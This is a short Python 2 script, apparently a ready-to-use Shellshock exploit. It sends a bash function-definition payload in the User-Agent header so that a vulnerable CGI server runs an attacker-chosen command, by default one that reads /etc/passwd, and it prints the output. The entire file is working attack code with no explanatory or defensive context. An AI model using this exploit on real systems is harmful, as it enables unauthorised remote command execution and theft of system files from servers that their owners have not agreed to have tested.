import sys
import urllib2
import pdb

if len(sys.argv) < 2:
    print "Usage: python "+sys.argv[0]+" <URL> [CMD]"
    sys.exit(0)

target_url = sys.argv[1]
try:
    cmd = sys.argv[2]
except IndexError:
    cmd = "cat /etc/passwd;"

print "[+] Attempting shellshock...."

opener = urllib2.build_opener()
opener.addheaders = [
    ('User-agent', "() { :; }; echo; echo; /bin/bash -c '"+cmd+"'")
]

try:
    response = opener.open(target_url)
    for line in response.readlines():
        print line.strip()
except Exception as e:
    print e
